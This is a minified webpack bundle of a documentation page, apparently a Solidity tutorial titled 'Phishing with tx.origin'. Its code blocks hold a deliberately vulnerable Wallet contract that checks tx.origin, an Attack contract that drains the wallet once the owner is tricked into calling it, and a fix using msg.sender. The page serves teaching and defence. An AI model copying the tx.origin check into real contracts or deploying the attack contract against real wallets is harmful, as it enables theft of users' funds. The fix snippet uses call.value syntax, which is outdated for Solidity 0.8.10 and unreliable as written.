"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4173],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return f}});var r=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),p=s(t),f=i,h=p["".concat(c,".").concat(f)]||p[f]||d[f]||a;return t?r.createElement(h,o(o({ref:n},u),{},{components:t})):r.createElement(h,o({ref:n},u))}));function f(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,o=new Array(a);o[0]=p;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var s=2;s<a;s++)o[s]=t[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},2933:function(e,n,t){t.r(n),t.d(n,{contentTitle:function(){return c},default:function(){return p},frontMatter:function(){return l},metadata:function(){return s},toc:function(){return u}});var r=t(7462),i=t(3366),a=(t(7294),t(3905)),o=["components"],l={title:"Phishing with tx.origin",version:"0.8.10",description:"An example of phishing with tx.origin in Solidity"},c=void 0,s={unversionedId:"Example/TxOrigin",id:"Example/TxOrigin",isDocsHomePage:!1,title:"Phishing with tx.origin",description:"An example of phishing with tx.origin in Solidity",source:"@site/docs/Example/TxOrigin.md",sourceDirName:"Example",slug:"/Example/TxOrigin",permalink:"/rooctblog/docs/Example/TxOrigin",tags:[],version:"current",frontMatter:{title:"Phishing with tx.origin",version:"0.8.10",description:"An example of phishing with tx.origin in Solidity"},sidebar:"tutorialSidebar",previous:{title:"Try Catch",permalink:"/rooctblog/docs/Example/TryCatch"},next:{title:"Variables",permalink:"/rooctblog/docs/Example/Variables"}},u=[{value:"What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?",id:"whats-the-difference-between-msgsender-and-txorigin",children:[]},{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],d={toc:u};function p(e){var n=e.components,t=(0,i.Z)(e,o);return(0,a.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h3",{id:"whats-the-difference-between-msgsender-and-txorigin"},"What's the difference between ",(0,a.kt)("inlineCode",{parentName:"h3"},"msg.sender")," and ",(0,a.kt)("inlineCode",{parentName:"h3"},"tx.origin"),"?"),(0,a.kt)("p",null,"If contract A calls B, and B calls C, in C ",(0,a.kt)("inlineCode",{parentName:"p"},"msg.sender")," is B and ",(0,a.kt)("inlineCode",{parentName:"p"},"tx.origin")," is A."),(0,a.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,a.kt)("p",null,"A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice's Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice's wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n\n")),(0,a.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,a.kt)("p",null,"Use ",(0,a.kt)("inlineCode",{parentName:"p"},"msg.sender")," instead of ",(0,a.kt)("inlineCode",{parentName:"p"},"tx.origin")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'function transfer(address payable _to, uint256 _amount) public {\n  require(msg.sender == owner, "Not owner");\n\n  (bool sent, ) = _to.call.value(_amount)("");\n  require(sent, "Failed to send Ether");\n}\n\n')))}p.isMDXComponent=!0}}]);